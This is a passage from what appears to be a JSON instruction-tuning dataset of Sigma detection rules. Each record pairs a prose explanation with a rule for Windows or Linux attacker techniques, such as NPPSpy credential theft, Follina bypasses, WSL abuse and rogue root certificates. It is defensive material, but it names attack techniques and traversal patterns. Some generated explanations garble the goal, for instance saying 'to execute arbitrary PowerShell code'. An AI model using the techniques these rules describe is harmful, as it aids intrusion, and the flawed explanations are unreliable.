      "Sigma": "logsource:\n    product: linux\n    service: auditd\ndetection:\n    path:\n        type: 'PATH'\n        nametype: 'CREATE'\n    name_1:\n        name|startswith:\n            - '/usr/lib/systemd/system/'\n            - '/etc/systemd/system/'\n    name_2:\n        name|contains: '/.config/systemd/user/'\n    condition: path and 1 of name_*\nfalsepositives:\n    - Admin work like legit service installs.\nlevel: medium\n",
      "question": "creation of systemd services which could be used by adversaries to execute malicious code.",
      "answer": "In order to detect the creation of systemd services which could be used by adversaries to execute malicious code, you should monitor audit logs on Linux systems, specifically those from auditd, for events related to the creation of paths. Focus on events where the type of action is \"CREATE.\" Look specifically for the creation of names starting with '/usr/lib/systemd/system/' or '/etc/systemd/system/' as well as names that contain '/.config/systemd/user/'. These locations are commonly associated with systemd service files, which can be exploited by attackers to execute malicious code persistently on a system. Be aware that administrative actions such as legitimate service installation may trigger these alerts, hence they are considered potential false positives. This detection strategy is of medium importance and is aligned with understanding and responding to tactics and techniques related to the execution of unauthorized commands or scripts through system service manipulation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of an Office application that points to a document that is located in a trusted location. Attackers often used this to avoid macro security and execute their malicious code..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of an Office application that points to a document that is located in a trusted location, which attackers often use to avoid macro security and execute their malicious code, you should monitor process creation events on Windows systems. Specifically, check for processes started (children) from common user shells like Explorer.exe or Directory Opus (dopus.exe) that indicate a user-initiated action. Focus on the execution of Microsoft Office applications such as Excel (EXCEL.EXE), PowerPoint (POWERPNT.EXE), and Word (WINWORD.exe), including their respective original file names (Excel.exe, POWERPNT.EXE, WinWord.exe).\n\nIt is important to examine the command line paths used to launch these applications, ensuring they originate from well-known, trusted locations such as various default Microsoft Office Templates directories under `\\AppData\\Roaming\\Microsoft\\` and `\\Microsoft Office\\` (both x86 and root directories). This verification helps in identifying processes that are trying to execute code from what appears to be legitimate, trusted locations\u2014a common technique used by attackers to bypass macro security features.\n\nHowever, to reduce false positives and avoid flagging benign user activities, such as opening legitimate template files, exclude command lines that end with typical template file extensions like `.dotx` (Word), `.xltx` (Excel), and `.potx` (PowerPoint). Paying attention to these details enhances the detection accuracy of potential malicious activities exploiting trusted locations to execute harmful code, while minimizing the chances of misidentifying normal user behavior as suspicious.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        # Note: we add a parent shell to reduce FP. Add additional 3rd party shells that you might use\n        ParentImage|endswith:\n            - '\\explorer.exe'\n            - '\\dopus.exe'\n    selection_img:\n        - Image|endswith:\n            - '\\EXCEL.EXE'\n            - '\\POWERPNT.EXE'\n            - '\\WINWORD.exe'\n        - OriginalFileName:\n            - 'Excel.exe'\n            - 'POWERPNT.EXE'\n            - 'WinWord.exe'\n    selection_trusted_location:\n        CommandLine|contains:\n            # Note: these are the default locations. Admins/Users could add additional ones that you need to cover\n            - '\\AppData\\Roaming\\Microsoft\\Templates'\n            - '\\AppData\\Roaming\\Microsoft\\Word\\Startup\\'\n            - '\\Microsoft Office (x86)\\root\\Templates\\'\n            - '\\Microsoft Office (x86)\\Templates\\'\n            - '\\Microsoft Office\\root\\Templates\\'\n            - '\\Microsoft Office\\Templates\\'\n    filter_main_dotx:\n        # Note: We add this filter to avoid curious people clicking on template files\n        CommandLine|endswith:\n            - '.dotx'\n            - '.xltx'\n            - '.potx'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        # Note: we add a parent shell to reduce FP. Add additional 3rd party shells that you might use\n        ParentImage|endswith:\n            - '\\explorer.exe'\n            - '\\dopus.exe'\n    selection_img:\n        - Image|endswith:\n            - '\\EXCEL.EXE'\n            - '\\POWERPNT.EXE'\n            - '\\WINWORD.exe'\n        - OriginalFileName:\n            - 'Excel.exe'\n            - 'POWERPNT.EXE'\n            - 'WinWord.exe'\n    selection_trusted_location:\n        CommandLine|contains:\n            # Note: these are the default locations. Admins/Users could add additional ones that you need to cover\n            - '\\AppData\\Roaming\\Microsoft\\Templates'\n            - '\\AppData\\Roaming\\Microsoft\\Word\\Startup\\'\n            - '\\Microsoft Office (x86)\\root\\Templates\\'\n            - '\\Microsoft Office (x86)\\Templates\\'\n            - '\\Microsoft Office\\root\\Templates\\'\n            - '\\Microsoft Office\\Templates\\'\n    filter_main_dotx:\n        # Note: We add this filter to avoid curious people clicking on template files\n        CommandLine|endswith:\n            - '.dotx'\n            - '.xltx'\n            - '.potx'\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "execution of an Office application that points to a document that is located in a trusted location. Attackers often used this to avoid macro security and execute their malicious code.",
      "answer": "In order to detect the execution of an Office application that points to a document that is located in a trusted location, which attackers often use to avoid macro security and execute their malicious code, you should monitor process creation events on Windows systems. Specifically, check for processes started (children) from common user shells like Explorer.exe or Directory Opus (dopus.exe) that indicate a user-initiated action. Focus on the execution of Microsoft Office applications such as Excel (EXCEL.EXE), PowerPoint (POWERPNT.EXE), and Word (WINWORD.exe), including their respective original file names (Excel.exe, POWERPNT.EXE, WinWord.exe).\n\nIt is important to examine the command line paths used to launch these applications, ensuring they originate from well-known, trusted locations such as various default Microsoft Office Templates directories under `\\AppData\\Roaming\\Microsoft\\` and `\\Microsoft Office\\` (both x86 and root directories). This verification helps in identifying processes that are trying to execute code from what appears to be legitimate, trusted locations\u2014a common technique used by attackers to bypass macro security features.\n\nHowever, to reduce false positives and avoid flagging benign user activities, such as opening legitimate template files, exclude command lines that end with typical template file extensions like `.dotx` (Word), `.xltx` (Excel), and `.potx` (PowerPoint). Paying attention to these details enhances the detection accuracy of potential malicious activities exploiting trusted locations to execute harmful code, while minimizing the chances of misidentifying normal user behavior as suspicious."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Office applications executing a child process that includes directory traversal patterns. This could be an attempt to exploit CVE-2022-30190 (MSDT RCE) or CVE-2021-40444 (MSHTML RCE).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect Office applications executing a child process that includes directory traversal patterns, which could be an attempt to exploit CVE-2022-30190 (MSDT RCE) or CVE-2021-40444 (MSHTML RCE), you should: monitor the creation of processes on Windows systems, specifically focusing on those spawned by Microsoft Office applications such as Word, Excel, PowerPoint, Access, Publisher, Equation Editor, and Visio. Look for command lines that contain directory traversal patterns such as '../../../..' or '..\\..\\..\\..' or '..//..//..//..'. These patterns suggest an attempt to break out of the restricted directory to potentially execute malicious files or commands located in other directories. This behavior is highly indicative of an attack aiming to exploit vulnerabilities in Microsoft Office products, warranting a high level of concern due to the potential for remote code execution and the consequent exposure to a significant risk.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\winword.exe'\n            - '\\excel.exe'\n            - '\\powerpnt.exe'\n            - '\\msaccess.exe'\n            - '\\mspub.exe'\n            - '\\eqnedt32.exe'\n            - '\\visio.exe'\n        CommandLine|contains:\n            - '../../../..'\n            - '..\\..\\..\\..'\n            - '..//..//..//..'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        ParentImage|endswith:\n            - '\\winword.exe'\n            - '\\excel.exe'\n            - '\\powerpnt.exe'\n            - '\\msaccess.exe'\n            - '\\mspub.exe'\n            - '\\eqnedt32.exe'\n            - '\\visio.exe'\n        CommandLine|contains:\n            - '../../../..'\n            - '..\\..\\..\\..'\n            - '..//..//..//..'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "Office applications executing a child process that includes directory traversal patterns. This could be an attempt to exploit CVE-2022-30190 (MSDT RCE) or CVE-2021-40444 (MSHTML RCE)",
      "answer": "In order to detect Office applications executing a child process that includes directory traversal patterns, which could be an attempt to exploit CVE-2022-30190 (MSDT RCE) or CVE-2021-40444 (MSHTML RCE), you should: monitor the creation of processes on Windows systems, specifically focusing on those spawned by Microsoft Office applications such as Word, Excel, PowerPoint, Access, Publisher, Equation Editor, and Visio. Look for command lines that contain directory traversal patterns such as '../../../..' or '..\\..\\..\\..' or '..//..//..//..'. These patterns suggest an attempt to break out of the restricted directory to potentially execute malicious files or commands located in other directories. This behavior is highly indicative of an attack aiming to exploit vulnerabilities in Microsoft Office products, warranting a high level of concern due to the potential for remote code execution and the consequent exposure to a significant risk."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect activities where adversaries install a root certificate on a compromised system to avoid warnings when connecting to adversary-controlled web servers, you should monitor for the creation of processes on Windows systems where the command line contains specific indicators. These indicators include the use of 'Import-Certificate' along with ' -FilePath ' and the path 'Cert:\\LocalMachine\\Root', suggesting the installation of a certificate into the system's root store. Additionally, the command line may contain references to common temporary and user directories, such as '\\AppData\\Local\\Temp\\', ':\\Windows\\TEMP\\', '\\Desktop\\', '\\Downloads\\', '\\Perflogs\\', and ':\\Users\\Public\\'. These directories are often used by adversaries to temporarily store malicious files. Monitoring for these command-line patterns is crucial for identifying potentially malicious activities related to the installation of unauthorized root certificates. Such activities are flagged with a high level of concern due to their rare legitimate use, making false positives unlikely. This detection strategy is focused on identifying the tactics and techniques associated with credential access, persistence, and defense evasion by monitoring process creation logs in Windows environments.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'Import-Certificate'\n            - ' -FilePath '\n            - 'Cert:\\LocalMachine\\Root'\n        CommandLine|contains:\n            - '\\AppData\\Local\\Temp\\'\n            - ':\\Windows\\TEMP\\'\n            - '\\Desktop\\'\n            - '\\Downloads\\'\n            - '\\Perflogs\\'\n            - ':\\Users\\Public\\'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - 'Import-Certificate'\n            - ' -FilePath '\n            - 'Cert:\\LocalMachine\\Root'\n        CommandLine|contains:\n            - '\\AppData\\Local\\Temp\\'\n            - ':\\Windows\\TEMP\\'\n            - '\\Desktop\\'\n            - '\\Downloads\\'\n            - '\\Perflogs\\'\n            - ':\\Users\\Public\\'\n    condition: selection\nfalsepositives:\n    - Unlikely\nlevel: high\n",
      "question": "Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers.",
      "answer": "In order to detect activities where adversaries install a root certificate on a compromised system to avoid warnings when connecting to adversary-controlled web servers, you should monitor for the creation of processes on Windows systems where the command line contains specific indicators. These indicators include the use of 'Import-Certificate' along with ' -FilePath ' and the path 'Cert:\\LocalMachine\\Root', suggesting the installation of a certificate into the system's root store. Additionally, the command line may contain references to common temporary and user directories, such as '\\AppData\\Local\\Temp\\', ':\\Windows\\TEMP\\', '\\Desktop\\', '\\Downloads\\', '\\Perflogs\\', and ':\\Users\\Public\\'. These directories are often used by adversaries to temporarily store malicious files. Monitoring for these command-line patterns is crucial for identifying potentially malicious activities related to the installation of unauthorized root certificates. Such activities are flagged with a high level of concern due to their rare legitimate use, making false positives unlikely. This detection strategy is focused on identifying the tactics and techniques associated with credential access, persistence, and defense evasion by monitoring process creation logs in Windows environments."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to execute arbitrary PowerShell code using SyncAppvPublishingServer.vbs, you should: focus on monitoring the creation of processes within Windows environments. Specifically, look for instances where the command line contains references to '\\SyncAppvPublishingServer.vbs' combined with the use of a semi-colon, indicating the possible execution of additional arbitrary code. This activity can be indicative of attempts to execute unauthorized PowerShell commands, potentially for malicious purposes. It is essential to keep track of the computer name, user, command line, and parent command line used in these situations to aid in identifying and mitigating such threats. Be aware that while this method of detection is useful, there may be instances where it does not apply (unknown false positives), so it's important to verify the context of detections to avoid misinterpretation.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\SyncAppvPublishingServer.vbs'\n            - ';'  # at a minimum, a semi-colon is required\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|all:\n            - '\\SyncAppvPublishingServer.vbs'\n            - ';'  # at a minimum, a semi-colon is required\n    condition: selection\nfields:\n    - ComputerName\n    - User\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "Executes arbitrary PowerShell code using SyncAppvPublishingServer.vbs",
      "answer": "In order to execute arbitrary PowerShell code using SyncAppvPublishingServer.vbs, you should: focus on monitoring the creation of processes within Windows environments. Specifically, look for instances where the command line contains references to '\\SyncAppvPublishingServer.vbs' combined with the use of a semi-colon, indicating the possible execution of additional arbitrary code. This activity can be indicative of attempts to execute unauthorized PowerShell commands, potentially for malicious purposes. It is essential to keep track of the computer name, user, command line, and parent command line used in these situations to aid in identifying and mitigating such threats. Be aware that while this method of detection is useful, there may be instances where it does not apply (unknown false positives), so it's important to verify the context of detections to avoid misinterpretation."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts.\nWithout knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to prevent adversaries with no prior knowledge of legitimate credentials within the system or environment from guessing passwords in an attempt to access accounts, you should monitor PowerShell scripts for specific signs of malicious activity targeting LDAP (Lightweight Directory Access Protocol) services. Focus on the Windows platform and ensure Script Block Logging is enabled to capture the necessary information. Look for any PowerShell scripts containing references to 'System.DirectoryServices.Protocols.LdapDirectoryIdentifier', 'System.Net.NetworkCredential', or 'System.DirectoryServices.Protocols.LdapConnection'. These references might indicate an attempt to access LDAP services possibly for credential validation or usage in unauthorized manners. Be aware that this detection operates at a low level of alert, suggesting there might be unknown scenarios that trigger false positives. Therefore, while monitoring for these indicators is crucial, each alert should be carefully investigated to differentiate between malicious activities and benign operations involving LDAP queries or connections.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'System.DirectoryServices.Protocols.LdapDirectoryIdentifier'\n            - 'System.Net.NetworkCredential'\n            - 'System.DirectoryServices.Protocols.LdapConnection'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: ps_script\n    definition: 'Requirements: Script Block Logging must be enabled'\ndetection:\n    selection:\n        ScriptBlockText|contains:\n            - 'System.DirectoryServices.Protocols.LdapDirectoryIdentifier'\n            - 'System.Net.NetworkCredential'\n            - 'System.DirectoryServices.Protocols.LdapConnection'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts.\nWithout knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism\n",
      "answer": "In order to prevent adversaries with no prior knowledge of legitimate credentials within the system or environment from guessing passwords in an attempt to access accounts, you should monitor PowerShell scripts for specific signs of malicious activity targeting LDAP (Lightweight Directory Access Protocol) services. Focus on the Windows platform and ensure Script Block Logging is enabled to capture the necessary information. Look for any PowerShell scripts containing references to 'System.DirectoryServices.Protocols.LdapDirectoryIdentifier', 'System.Net.NetworkCredential', or 'System.DirectoryServices.Protocols.LdapConnection'. These references might indicate an attempt to access LDAP services possibly for credential validation or usage in unauthorized manners. Be aware that this detection operates at a low level of alert, suggesting there might be unknown scenarios that trigger false positives. Therefore, while monitoring for these indicators is crucial, each alert should be carefully investigated to differentiate between malicious activities and benign operations involving LDAP queries or connections."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting when an attacker tries to add a new network provider in order to dump clear text credentials, similar to how the NPPSpy tool does it.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect when an attacker tries to add a new network provider in order to dump clear text credentials, similar to how the NPPSpy tool does it, you should monitor registry settings particularly focusing on changes within the Windows environment. Keep an eye on the registry set category, specifically targeting instances where the event type is 'SetValue'. This indicates a modification action on the registry.\n\nFocus on modifications targeting objects within the '\\System\\CurrentControlSet\\Services\\' directory that also include '\\NetworkProvider'. These areas are critical because they involve the configuration of network services, where malicious modifications can serve as a mechanism for credential theft.\n\nHowever, it's important to apply certain filters to avoid false positives and focus on potentially malicious activity. Exclude modifications targeting the WebClient, LanmanWorkstation, and RDPNP services under the '\\NetworkProvider' path because changes to these might not necessarily indicate malicious behavior and are sometimes part of legitimate network configurations. These exclusions are essential to narrow down the detection to alterations more closely associated with attack techniques that involve the addition of rogue network providers.\n\nMoreover, take into consideration the process responsible for making the registry changes. Specifically, if the changes come from 'C:\\Windows\\System32\\poqexec.exe', it might not be considered suspicious under certain circumstances. This process, when involved in legitimate operations, can help mitigate false positives, given its potential use in benign system configurations.\n\nThese monitoring and filtering strategies involve working with tags correlated with MITRE ATT&CK tactics and techniques, although specific technique identifiers should be derived from the nature of logged events and the context of observed changes. \n\nBe aware that there can be instances where legitimate software or configurations could trigger these detections. Hence, maintaining an up-to-date filter list and understanding the operational environment are critical to distinguishing between genuine threats and operational noise. This approach ensures heightened vigilance against methods employed for credential theft through unauthorized network provider modifications.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains|all:\n            - '\\System\\CurrentControlSet\\Services\\'\n            - '\\NetworkProvider'\n    filter:\n        TargetObject|contains:\n            - '\\System\\CurrentControlSet\\Services\\WebClient\\NetworkProvider'\n            - '\\System\\CurrentControlSet\\Services\\LanmanWorkstation\\NetworkProvider'\n            - '\\System\\CurrentControlSet\\Services\\RDPNP\\NetworkProvider'\n            #- '\\System\\CurrentControlSet\\Services\\P9NP\\NetworkProvider' # Related to WSL remove the comment if you use WSL in your ENV\n    filter_valid_procs:\n        Image: C:\\Windows\\System32\\poqexec.exe\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Other legitimate network providers used and not filtred in this rule\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains|all:\n            - '\\System\\CurrentControlSet\\Services\\'\n            - '\\NetworkProvider'\n    filter:\n        TargetObject|contains:\n            - '\\System\\CurrentControlSet\\Services\\WebClient\\NetworkProvider'\n            - '\\System\\CurrentControlSet\\Services\\LanmanWorkstation\\NetworkProvider'\n            - '\\System\\CurrentControlSet\\Services\\RDPNP\\NetworkProvider'\n            #- '\\System\\CurrentControlSet\\Services\\P9NP\\NetworkProvider' # Related to WSL remove the comment if you use WSL in your ENV\n    filter_valid_procs:\n        Image: C:\\Windows\\System32\\poqexec.exe\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Other legitimate network providers used and not filtred in this rule\nlevel: medium\n",
      "question": "when an attacker tries to add a new network provider in order to dump clear text credentials, similar to how the NPPSpy tool does it",
      "answer": "In order to detect when an attacker tries to add a new network provider in order to dump clear text credentials, similar to how the NPPSpy tool does it, you should monitor registry settings particularly focusing on changes within the Windows environment. Keep an eye on the registry set category, specifically targeting instances where the event type is 'SetValue'. This indicates a modification action on the registry.\n\nFocus on modifications targeting objects within the '\\System\\CurrentControlSet\\Services\\' directory that also include '\\NetworkProvider'. These areas are critical because they involve the configuration of network services, where malicious modifications can serve as a mechanism for credential theft.\n\nHowever, it's important to apply certain filters to avoid false positives and focus on potentially malicious activity. Exclude modifications targeting the WebClient, LanmanWorkstation, and RDPNP services under the '\\NetworkProvider' path because changes to these might not necessarily indicate malicious behavior and are sometimes part of legitimate network configurations. These exclusions are essential to narrow down the detection to alterations more closely associated with attack techniques that involve the addition of rogue network providers.\n\nMoreover, take into consideration the process responsible for making the registry changes. Specifically, if the changes come from 'C:\\Windows\\System32\\poqexec.exe', it might not be considered suspicious under certain circumstances. This process, when involved in legitimate operations, can help mitigate false positives, given its potential use in benign system configurations.\n\nThese monitoring and filtering strategies involve working with tags correlated with MITRE ATT&CK tactics and techniques, although specific technique identifiers should be derived from the nature of logged events and the context of observed changes. \n\nBe aware that there can be instances where legitimate software or configurations could trigger these detections. Hence, maintaining an up-to-date filter list and understanding the operational environment are critical to distinguishing between genuine threats and operational noise. This approach ensures heightened vigilance against methods employed for credential theft through unauthorized network provider modifications."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting enabling TurnOffCheck which can be used to bypass defense of MSDT Follina vulnerability.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect enabling TurnOffCheck which can be used to bypass defense of MSDT Follina vulnerability, you should: Monitor Windows Registry settings modification events, specifically focusing on the 'SetValue' EventType. Look for changes aimed at the registry path ending with '\\Policies\\Microsoft\\Windows\\ScriptedDiagnostics\\TurnOffCheck'. The modification of interest involves setting a DWORD value to '0x00000001'. It's crucial to be aware that legitimate administrator actions might also trigger such changes, so these should be considered as potential false positives. This detection operates under a medium threat level and aids in identifying tactics and techniques associated with bypassing security mechanisms.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Policies\\Microsoft\\Windows\\ScriptedDiagnostics\\TurnOffCheck'\n        Details: 'DWORD (0x00000001)'\n    condition: selection\nfalsepositives:\n    - Administrator actions\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_set\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|endswith: '\\Policies\\Microsoft\\Windows\\ScriptedDiagnostics\\TurnOffCheck'\n        Details: 'DWORD (0x00000001)'\n    condition: selection\nfalsepositives:\n    - Administrator actions\nlevel: medium\n",
      "question": "enabling TurnOffCheck which can be used to bypass defense of MSDT Follina vulnerability",
      "answer": "In order to detect enabling TurnOffCheck which can be used to bypass defense of MSDT Follina vulnerability, you should: Monitor Windows Registry settings modification events, specifically focusing on the 'SetValue' EventType. Look for changes aimed at the registry path ending with '\\Policies\\Microsoft\\Windows\\ScriptedDiagnostics\\TurnOffCheck'. The modification of interest involves setting a DWORD value to '0x00000001'. It's crucial to be aware that legitimate administrator actions might also trigger such changes, so these should be considered as potential false positives. This detection operates under a medium threat level and aids in identifying tactics and techniques associated with bypassing security mechanisms."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential abuse of Windows Subsystem for Linux (WSL) binary as a LOLBIN to execute arbitrary Linux or Windows commands.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential abuse of Windows Subsystem for Linux (WSL) binary as a LOLBIN to execute arbitrary Linux or Windows commands, you should: monitor process creation logs on Windows systems for the execution of 'wsl.exe'. Pay special attention to commands that end with 'wsl.exe', or where the original file name is exactly 'wsl.exe'. Look for command line arguments that include '-e', '--exec', '--system', '--shell-type', use of the '/mnt/c' path indicating access to the Windows 'C:\\' partition through WSL, execution as the 'root' user through '--user root' or '-u root', and '--debug-shell'. These command line arguments might be indicators of an attempt to execute unauthorized or malicious commands through WSL.\n\nAdditionally, consider commands that are specifically designed to kill processes spawned from WSL, which might have legitimate uses such as script automation or the termination of processes opened via WSL (e.g., a Visual Studio Code WSL server). Such commands typically involve the parent process image ending with '\\cmd.exe', and the command line contains both '-d' and '-e kill'. However, these should be excluded from alerts if they match known benign patterns.\n\nBe aware of false positives which may occur from legitimate automation and orchestration scripts or the rightful use of WSL by Windows for tasks like killing processes. The security level for these detections is considered medium.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wsl.exe'\n        - OriginalFileName: 'wsl.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -e '\n            - ' --exec'\n            - ' --system'\n            - ' --shell-type '\n            - ' /mnt/c' # Path to mounted \"C:\\\" partition (Indication of running Windows binaries via WSL)\n            - ' --user root'\n            - ' -u root'\n            - '--debug-shell'\n    filter_main_kill:\n        # This filter is to handle a FP that occurs when a process is spawned from WSL and then closed by the user\n        # Example would be to open VsCode through it's server extension from WSL\n            # GrandparentCommandLine: \"C:\\Users\\XXX\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\" --ms-enable-electron-run-as-node c:\\Users\\XXX\\.vscode\\extensions\\ms-vscode-remote.remote-wsl-0.72.0\\dist\\wslDaemon.js\n            # ParentCommandLine: C:\\WINDOWS\\system32\\cmd.exe /d /s /c \"C:\\WINDOWS\\System32\\wsl.exe -d Ubuntu-20.04 -e kill 1366\"\n            # CommandLine: C:\\WINDOWS\\System32\\wsl.exe -d Ubuntu-20.04 -e kill 1366\n        ParentImage|endswith: '\\cmd.exe'\n        CommandLine|contains|all:\n            - ' -d '\n            - ' -e kill '\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Automation and orchestration scripts may use this method to execute scripts etc.\n    - Legitimate use by Windows to kill processes opened via WSL (example VsCode WSL server)\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\wsl.exe'\n        - OriginalFileName: 'wsl.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' -e '\n            - ' --exec'\n            - ' --system'\n            - ' --shell-type '\n            - ' /mnt/c' # Path to mounted \"C:\\\" partition (Indication of running Windows binaries via WSL)\n            - ' --user root'\n            - ' -u root'\n            - '--debug-shell'\n    filter_main_kill:\n        # This filter is to handle a FP that occurs when a process is spawned from WSL and then closed by the user\n        # Example would be to open VsCode through it's server extension from WSL\n            # GrandparentCommandLine: \"C:\\Users\\XXX\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\" --ms-enable-electron-run-as-node c:\\Users\\XXX\\.vscode\\extensions\\ms-vscode-remote.remote-wsl-0.72.0\\dist\\wslDaemon.js\n            # ParentCommandLine: C:\\WINDOWS\\system32\\cmd.exe /d /s /c \"C:\\WINDOWS\\System32\\wsl.exe -d Ubuntu-20.04 -e kill 1366\"\n            # CommandLine: C:\\WINDOWS\\System32\\wsl.exe -d Ubuntu-20.04 -e kill 1366\n        ParentImage|endswith: '\\cmd.exe'\n        CommandLine|contains|all:\n            - ' -d '\n            - ' -e kill '\n    condition: all of selection_* and not 1 of filter_main_*\nfalsepositives:\n    - Automation and orchestration scripts may use this method to execute scripts etc.\n    - Legitimate use by Windows to kill processes opened via WSL (example VsCode WSL server)\nlevel: medium\n",
      "question": "potential abuse of Windows Subsystem for Linux (WSL) binary as a LOLBIN to execute arbitrary Linux or Windows commands",
      "answer": "In order to detect potential abuse of Windows Subsystem for Linux (WSL) binary as a LOLBIN to execute arbitrary Linux or Windows commands, you should: monitor process creation logs on Windows systems for the execution of 'wsl.exe'. Pay special attention to commands that end with 'wsl.exe', or where the original file name is exactly 'wsl.exe'. Look for command line arguments that include '-e', '--exec', '--system', '--shell-type', use of the '/mnt/c' path indicating access to the Windows 'C:\\' partition through WSL, execution as the 'root' user through '--user root' or '-u root', and '--debug-shell'. These command line arguments might be indicators of an attempt to execute unauthorized or malicious commands through WSL.\n\nAdditionally, consider commands that are specifically designed to kill processes spawned from WSL, which might have legitimate uses such as script automation or the termination of processes opened via WSL (e.g., a Visual Studio Code WSL server). Such commands typically involve the parent process image ending with '\\cmd.exe', and the command line contains both '-d' and '-e kill'. However, these should be excluded from alerts if they match known benign patterns.\n\nBe aware of false positives which may occur from legitimate automation and orchestration scripts or the rightful use of WSL by Windows for tasks like killing processes. The security level for these detections is considered medium."
    }
  },
  {
